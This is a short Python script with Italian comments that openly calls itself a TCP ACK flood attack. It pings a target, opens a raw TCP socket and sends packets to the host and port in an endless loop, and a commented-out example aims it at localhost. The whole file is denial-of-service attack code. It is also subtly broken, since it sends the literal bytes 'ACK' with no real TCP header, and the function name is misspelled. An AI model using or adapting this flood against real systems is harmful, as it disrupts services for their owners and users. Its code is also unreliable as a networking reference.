import socket
import subprocess


#questo codice esegue un attacco TCP ACK flood
def is_host_reachable(host_ip):
  """Verifica se l'host è raggiungibile.

  Args:
    host_ip: L'indirizzo IP dell'host da verificare.

  Returns:
    True se l'host è raggiungibile, False altrimenti.
  """

  return subprocess.run(["ping", "-c", "3", host_ip],
                         capture_output=True,
                         text=True).returncode == 0
def tcp_ack_floos(host,port):
    if not is_host_reachable(host):
        raise ValueError("L'host non è raggiungibile.")
    with socket.socket(socket.AF_INET,socket.SOCK_RAW, socket.IPPROTO_TCP) as sock:
        sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        sock.bind(("",port))
        while True:
            sock.sendto(b"ACK",(host,port))

#if __name__=="__main__":
    #host="127.0.0.1"
    #port=6640
    #tcp_ack_floos(host,port)
